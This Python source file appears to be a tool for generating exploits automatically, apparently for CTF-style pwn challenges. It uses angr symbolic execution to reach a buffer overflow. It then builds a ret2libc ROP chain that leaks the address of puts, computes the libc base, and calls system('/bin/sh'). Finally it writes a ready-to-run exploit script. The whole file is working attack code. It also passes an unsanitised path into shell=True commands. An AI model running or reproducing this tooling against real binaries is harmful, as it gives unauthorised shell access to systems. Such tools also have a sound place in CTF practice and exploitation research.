import angr, angrop
from pwncli import *

stdout_funcs = ['puts', 'write']


def get_imported_functions(angr_proj: angr.Project):
    imported_functions = []
    for obj in angr_proj.loader.initial_load_objects:
        if obj.is_main_bin:
            for symbol in obj.symbols:
                if symbol.is_import:
                    imported_functions.append(symbol.name)
    return imported_functions

def get_ret_addr(binary_path):
    command = "ROPgadget --binary {} --only 'ret'".format(binary_path)
    output = subprocess.check_output(command, shell=True)
    res = output.decode()
    lines = res.split('\n')
    for line in lines:
        if ': ret' in line:
            return int(line.split(' ')[0],16)
    return None

def get_poprdi_ret(binary_path):
    command = "ROPgadget --binary {} --only 'pop|ret' | grep 'rdi'".format(binary_path)
    output = subprocess.check_output(command, shell=True)
    res = output.decode()
    return int(res.split(' ')[0],16)

def get_puts_offset_of_libc(binary_path):
    command = "ldd {}".format(binary_path)
    output = subprocess.check_output(command, shell=True)
    res = output.decode()
    libc_path = res.split('\n')[1].split(' ')[2]
    command = "objdump {} -D -M intel | grep _IO_puts".format(libc_path)
    output = subprocess.check_output(command, shell=True)
    res = output.decode()
    lines = res.split('\n')
    for line in lines:
        if '<_IO_puts@@GLIBC_2.2.5>' in line:
            offset = int(line.split(' ')[0],16)
            return offset
    return None

def get_system_offset_of_libc(binary_path):
    command = "ldd {}".format(binary_path)
    output = subprocess.check_output(command, shell=True)
    res = output.decode()
    libc_path = res.split('\n')[1].split(' ')[2]
    command = "objdump {} -D -M intel | grep system".format(libc_path)
    output = subprocess.check_output(command, shell=True)
    res = output.decode()
    lines = res.split('\n')
    for line in lines:
        if '<__libc_system@@GLIBC_PRIVATE>' in line:
            offset = int(line.split(' ')[0],16)
            return offset
    return None

def get_binsh_offset_of_libc(binary_path):
    command = "ldd {}".format(binary_path)
    output = subprocess.check_output(command, shell=True)
    res = output.decode()
    libc_path = res.split('\n')[1].split(' ')[2]
    command = 'ROPgadget --binary {} --string "/bin/sh"'.format(libc_path)
    output = subprocess.check_output(command, shell=True)
    res = output.decode()
    lines = res.split('\n')
    for line in lines:
        if '/bin/sh' in line:
            offset = int(line.split(' ')[0],16)
            return offset
    return None

def find_main_address(binary_path):
    p = angr.Project(binary_path, auto_load_libs=False)
    main_symbol = p.loader.find_symbol("main")
    if main_symbol:
        return main_symbol.rebased_addr
    return None

def exp(binary_path, overflow_list):
    proj = angr.Project(binary_path)
    imported_functions = get_imported_functions(proj)
    if 'puts' in imported_functions:
        elf = ELF(binary_path)
        puts_plt = elf.plt['puts']
        puts_got = elf.got['puts']
        rdi = get_poprdi_ret(binary_path)
        for overflow in overflow_list:
            state = proj.factory.entry_state()
            simgr = proj.factory.simgr(state)
            simgr.explore(find=overflow['addr'])
            inp = simgr.found[0].posix.dumps(0)
            stdout = simgr.found[0].posix.dumps(1)
            payload = []
            p1=inp + b'a' * overflow['buf_size'] +p64_ex(0xdeadbeef) + p64_ex(rdi)+ p64_ex(puts_got)+ p64_ex(puts_plt)+p64_ex(find_main_address(binary_path))
            if os.path.exists("exp_cli.py"):
                os.remove("exp_cli.py")
            os.system("pwncli template cli")
            with open("exp_cli.py", "r") as file:
                lines = file.readlines()
            lines.insert(37, 'ru({})'.format(stdout))
            lines.insert(38, '\nsl({})'.format(p1))
            lines.insert(39, "\nputs_addr = u64_ex(ru('\\x7f')[-6:].ljust(8,b'\\x00'))\nprint(hex(puts_addr))")
            puts_offset = get_puts_offset_of_libc(binary_path)
            lines.insert(40, '\nlibc_base = puts_addr - {}'.format(hex(puts_offset)))
            lines.insert(41, '\nru({})'.format(stdout))
            system_offset = get_system_offset_of_libc(binary_path)
            binsh_str = get_binsh_offset_of_libc(binary_path)
            lines.insert(42, "\nsl(b'a' * {} +p64_ex(0xdeadbeef) + p64_ex({}) +p64_ex(libc_base+{})+p64_ex({})+p64_ex(libc_base+{}))".format(hex(overflow['buf_size']),hex(rdi),hex(binsh_str),hex(get_ret_addr(binary_path)),hex(system_offset)))
            with open("exp_cli.py", "w") as file:
                file.writelines(lines)
            log.info("[+] Success")
            log.info("[+] Run './exp_cli.py d {}' to exploit".format(binary_path))
    return payload
